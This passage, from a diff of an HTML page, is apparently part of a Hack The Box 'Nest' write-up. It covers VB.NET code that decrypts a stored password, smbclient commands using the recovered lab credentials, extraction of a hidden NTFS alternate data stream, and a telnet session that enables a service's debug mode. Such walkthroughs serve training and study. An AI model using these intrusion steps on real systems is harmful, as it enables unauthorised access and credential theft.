+&lt;span class="code-line"&gt;                              &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;passPhrase&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                              &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;saltValue&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;passwordIterations&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                              &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;initVector&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                              &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;keySize&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                      &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;initVectorBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;initVectorBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;saltValueBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;saltValueBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;cipherTextBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cipherTextBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;Rfc2898DeriveBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                          &lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                          &lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;keyBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;symmetricKey&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CipherMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;decryptor&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;ICryptoTransform&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;decryptor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateDecryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;memoryStream&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;memoryStream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;cryptoStream&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cryptoStream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                        &lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                        &lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;plainTextBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;ReDim&lt;/span&gt; &lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;decryptedByteCount&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;decryptedByteCount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                              &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                              &lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;plainText&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;plainText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                            &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                            &lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;plainText&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Module&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Running in debug mode" src="/media/2020.06/nest_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;We get the c.smith password: xRxRxPANCAK3SxRxRx. We can now connect to the
+"Users" share using c.smith account. We got the user.txt file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/Users -U &amp;quot;c.smith&amp;quot;%&amp;quot;xRxRxPANCAK3SxRxRx&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commands.&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \&amp;gt; cd C.Smith\&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \C.Smith\&amp;gt; mget user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Get file user.txt? y&lt;/span&gt;
+&lt;span class="code-line"&gt;getting file \C.Smith\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;p&gt;We enumerate more and found some configuration about the HQK service (the one on
+port 4386). There is also a file "Debug Mode Password.txt".
+The file can be copied on disk but is empty.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \C.Smith\&amp;gt; cd &amp;quot;HQK Reporting\&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \C.Smith\HQK Reporting\&amp;gt; dir&lt;/span&gt;
+&lt;span class="code-line"&gt;  .                                   D        0  Thu Aug  8 19:06:17 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;  ..                                  D        0  Thu Aug  8 19:06:17 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            10485247 blocks of size 4096. 6449598 blocks available&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="alternate-data-streams"&gt;Alternate data streams&lt;/h2&gt;
+&lt;p&gt;The file seems to be empty because its author used the &lt;a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/"&gt;NTFS alternate data
+streams&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;It is possible to get the information about the &lt;a href="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux"&gt;alternate data steams for a file
+using smbclient&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We require the informations about the file in C.Smith folder and we download the
+file using the alternate data stream.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# smbclient //10.10.10.178/Users -U &amp;quot;c.smith&amp;quot;%&amp;quot;xRxRxPANCAK3SxRxRx&amp;quot; -c &amp;#39;allinfo &amp;quot;C.Smith\HQK Reporting\Debug Mode Password.txt&amp;quot;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;altname: DEBUGM~1.TXT&lt;/span&gt;
+&lt;span class="code-line"&gt;create_time:    Thu Aug  8 07:06:12 PM 2019 EDT&lt;/span&gt;
+&lt;span class="code-line"&gt;access_time:    Thu Aug  8 07:06:12 PM 2019 EDT&lt;/span&gt;
+&lt;span class="code-line"&gt;write_time:     Thu Aug  8 07:08:17 PM 2019 EDT&lt;/span&gt;
+&lt;span class="code-line"&gt;change_time:    Thu Aug  8 07:08:17 PM 2019 EDT&lt;/span&gt;
+&lt;span class="code-line"&gt;attributes: A (20)&lt;/span&gt;
+&lt;span class="code-line"&gt;stream: [::$DATA], 0 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;stream: [:Password:$DATA], 15 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;root@kalili:~# smbclient //10.10.10.178/Users -U &amp;quot;c.smith&amp;quot;%&amp;quot;xRxRxPANCAK3SxRxRx&amp;quot; -c &amp;#39;get &amp;quot;C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt; &amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The file is not empty anymore and contain the password for the DEBUG mode of the HQK service.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# cat C.Smith\\HQK\ Reporting\\Debug\ Mode\ Password.txt\:Password\:\$DATA&lt;/span&gt;
+&lt;span class="code-line"&gt;WBQ201953D8w&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="hqkldapexe"&gt;HqkLdap.exe&lt;/h2&gt;
+&lt;p&gt;We enumerate the folder more and we found a HqkLdap.exe binary. We download it
+on our system.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \C.Smith\HQK Reporting\&amp;gt; cd &amp;quot;AD Integration Module&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \C.Smith\HQK Reporting\AD Integration Module\&amp;gt; dir&lt;/span&gt;
+&lt;span class="code-line"&gt;  .                                   D        0  Fri Aug  9 08:18:42 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;  ..                                  D        0  Fri Aug  9 08:18:42 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                10485247 blocks of size 4096. 6449664 blocks available&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \C.Smith\HQK Reporting\AD Integration Module\&amp;gt; mget HqkLdap.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;Get file HqkLdap.exe? y&lt;/span&gt;
+&lt;span class="code-line"&gt;getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (9.9 KiloBytes/sec) (average 9.9 KiloBytes/sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="debug-hqk-reporting-service"&gt;DEBUG HQK Reporting Service&lt;/h2&gt;
+&lt;p&gt;We connect to the service and start the debug mode.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# telnet 10.10.10.178 4386&lt;/span&gt;
+&lt;span class="code-line"&gt;Trying 10.10.10.178...&lt;/span&gt;
+&lt;span class="code-line"&gt;Connected to 10.10.10.178.&lt;/span&gt;
+&lt;span class="code-line"&gt;Escape character is &amp;#39;^]&amp;#39;.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HQK Reporting Service V1.2&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;DEBUG WBQ201953D8w&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Debug mode enabled. Use the HELP command to view additional commands that are now available&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We list the command to see what's new. The new commands are:
+  * SERVICE
+  * SESSION
+  * SHOWQUERY&lt;/p&gt;
+&lt;p&gt;We run them, session and service just show use informations about our session
+and the service.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;help&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;This service allows users to run queries against databases using the legacy HQK format&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- AVAILABLE COMMANDS ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;LIST&lt;/span&gt;
+&lt;span class="code-line"&gt;SETDIR &amp;lt;Directory_Name&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;RUNQUERY &amp;lt;Query_ID&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG &amp;lt;Password&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HELP &amp;lt;Command&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;SESSION&lt;/span&gt;
+&lt;span class="code-line"&gt;SHOWQUERY &amp;lt;Query_ID&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;session&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- Session Information ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Session ID: cb4c294e-1f27-4e1c-90e8-86d22367701e&lt;/span&gt;
+&lt;span class="code-line"&gt;Debug: True&lt;/span&gt;
+&lt;span class="code-line"&gt;Started At: 1/27/2020 4:33:48 PM&lt;/span&gt;
+&lt;span class="code-line"&gt;Server Endpoint: 10.10.10.178:4386&lt;/span&gt;
+&lt;span class="code-line"&gt;Client Endpoint: 10.10.14.30:36462&lt;/span&gt;
+&lt;span class="code-line"&gt;Current Query Directory: C:\Program Files\HQK\ALL QUERIES&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;service&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--- HQK REPORTING SERVER INFO ---&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Version: 1.2.0.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Server Hostname: HTB-NEST&lt;/span&gt;
+&lt;span class="code-line"&gt;Server Process: &amp;quot;C:\Program Files\HQK\HqkSvc.exe&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Server Running As: Service_HQK&lt;/span&gt;
+&lt;span class="code-line"&gt;Initial Query Directory: C:\Program Files\HQK\ALL QUERIES&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We go to the &lt;code&gt;C:\Program Files\HQK\&lt;/code&gt; directory.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;list&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;QUERY FILES IN CURRENT DIRECTORY&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  ALL QUERIES&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  LDAP&lt;/span&gt;
+&lt;span class="code-line"&gt;[DIR]  Logs&lt;/span&gt;
+&lt;span class="code-line"&gt;[1]   HqkSvc.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;[2]   HqkSvc.InstallState&lt;/span&gt;
+&lt;span class="code-line"&gt;[3]   HQK_Config.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The Showquery function allow use to read the files in the current directory.
+The file HQK_Config.xml contain our debugging password and the port of the
+service.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;showquery 3&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;ServiceSettings xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Port&amp;gt;4386&amp;lt;/Port&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;DebugPassword&amp;gt;WBQ201953D8w&amp;lt;/DebugPassword&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;QueryDirectory&amp;gt;C:\Program Files\HQK\ALL QUERIES&amp;lt;/QueryDirectory&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/ServiceSettings&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We go to the LDAP directory. We found the exe we already got and a configuration
+file. This file contain the Administrator encoded password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;setdir ldap&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current directory set to ldap&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;list&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
